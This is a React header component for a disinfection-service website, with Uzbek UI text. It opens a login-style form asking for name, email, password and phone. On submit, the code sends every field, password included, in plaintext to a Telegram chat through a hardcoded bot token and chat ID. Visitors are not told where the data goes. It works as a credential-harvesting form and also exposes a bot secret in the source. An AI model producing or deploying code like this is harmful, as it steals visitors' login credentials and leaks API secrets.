import React, { useState } from 'react'
import { Link } from 'react-router-dom'
import './Heaer.css'
import axios from 'axios' 

const Header = () => {
  const [open , setOpen] = useState(false);

    const sendMessage = (event)=>{
    event.preventDefault();
    const token = "8765834439:AAGcFaEzLpmhwsnAdAKgW103qUJqvFNed8s";
    const chat_id = 5795108304

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const name = document.getElementById("name").value
    const phone = document.getElementById("phone").value
    const email = document.getElementById("email").value
    const password = document.getElementById("password").value

    const messageContent = `ism : ${name}\ntel : ${phone} , email : ${email} , password: ${password}`

    axios({
      url : url ,
      method : "POST",
      data : {
       chat_id : chat_id ,
       text: messageContent,
      }
    })
    .then(()=>{
      alert("qabul qilindi");
    }).catch((err)=>{
      alert("Bo'sh maydon anqilandi")
    })


  }

  return (
    <header className="header">
      <div className="logo">Dizenfektsiya</div>

      <nav className="nav">
        <Link to="/home">Service</Link>
        <Link to="/about">About</Link>
        <Link to="/contact">Contact</Link>
        <Link to="/faq">Faq</Link>
      </nav>
      <button className='btn-sign' onClick={()=>setOpen(true)}>Kirish</button>

      {
      open && (
        <form className='onclick-div' onSubmit={sendMessage}>
          <div className='inputs'>
            <p>To'ldiring</p>
            <input type="text" placeholder='F.I.O' id='name'/>
            <input type="email" placeholder='email' id='email'/>
            <input type="password" placeholder='parol' id='password'/>
            <input type="text" placeholder='tel raqam' id='phone'/>
            <button className='btn-otish' type='submit'>O'tish</button>
          </div>
          <div>
            <button className='X' onClick={()=>setOpen(false)}>X</button>
          </div>
        </form>
      )
      }

    </header>
  )
}

export default Header